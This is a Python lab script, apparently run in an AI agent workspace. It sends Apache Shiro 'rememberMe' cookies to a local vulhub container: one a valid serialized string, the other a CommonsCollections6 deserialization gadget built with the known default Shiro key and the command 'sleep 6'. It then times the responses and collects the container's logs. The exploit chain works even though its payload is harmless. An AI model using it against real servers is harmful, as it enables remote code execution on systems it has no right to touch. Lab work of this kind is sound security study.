#!/usr/bin/env python3
# loop3 t7 C1 — 精确定位日志：投递 P1（合法序列化 String）与一条 gadget，抓取各自引发的异常
import json, os, re, subprocess, sys, time, datetime
import requests

CWD = r"C:\Users\Administrator\Documents\deepseek-harness\default-workspace"
SHIRO = "http://127.0.0.1:18081/"
UA = "loop3-t7/1.0 (authorized local lab)"
OUT_PATH = os.path.join(CWD, r"security\learning\_evidence\loop3-t7-c1-logtrace-20261012.json")
OUT = {"ts": datetime.datetime.now().isoformat(), "steps": []}


def rec(n, **kw):
    OUT["steps"].append({"step": n, **kw})
    print(f"--- {n}: " + json.dumps(kw, ensure_ascii=False)[:700], flush=True)
    return kw


def kali(cmd):
    r = subprocess.run([sys.executable, r"dsh-tools\kali-run.py", cmd],
                       capture_output=True, text=True, cwd=CWD)
    return r.stdout + r.stderr


def clean_b64(s):
    m = re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", s)
    return max(m, key=len) if m else ""


def full_logs():
    r = subprocess.run("docker logs vulhub-shiro-18081", shell=True, capture_output=True, text=True)
    return (r.stdout or "") + (r.stderr or "")


def send(label, ck):
    time.sleep(1.0)
    r = requests.get(SHIRO, headers={"User-Agent": UA, "Cookie": "rememberMe=" + ck},
                     timeout=40, allow_redirects=False)
    return {"status": r.status_code,
            "deleteMe": ("rememberMe=deleteMe" in r.headers.get("Set-Cookie", ""))}


# 先记录当前日志行数作为基线
base = full_logs()
base_lines = len(base.splitlines())
rec("log_baseline", lines=base_lines)

# --- 用例 1：P1 合法序列化 String（正确密钥）---
ck1 = clean_b64(kali("cat /tmp/t7-c1-matrix/P1_valid_serialized_string.txt"))
r1 = send("P1", ck1)
time.sleep(2.5)
after1 = full_logs()
new1 = after1.splitlines()[base_lines:]
rec("P1_response", **r1, cookie_len=len(ck1))
rec("P1_new_log", count=len(new1), lines=[l.strip() for l in new1 if l.strip()][:30])

# --- 用例 2：CC6 gadget（sleep 6）---
base2_lines = len(full_logs().splitlines())
kali("ruby /tmp/t7-c1-shiro-gen.rb CommonsCollections6 'sleep 6' /tmp/t7-logtrace-cc6.txt 'kPH+bIxk5D2deZiIxcaaaA==' 2>&1")
time.sleep(1)
ck2 = clean_b64(kali("cat /tmp/t7-logtrace-cc6.txt"))
t0 = time.time()
r2 = send("CC6_sleep6", ck2)
dt = time.time() - t0
time.sleep(2.5)
after2 = full_logs()
new2 = after2.splitlines()[base2_lines:]
rec("CC6_response", **r2, cookie_len=len(ck2), elapsed_s=round(dt, 3))
rec("CC6_new_log", count=len(new2), lines=[l.strip() for l in new2 if l.strip()][:40])

with open(OUT_PATH, "w", encoding="utf-8") as f:
    json.dump(OUT, f, ensure_ascii=False, indent=1)
print(json.dumps({"rc": "ok"}))
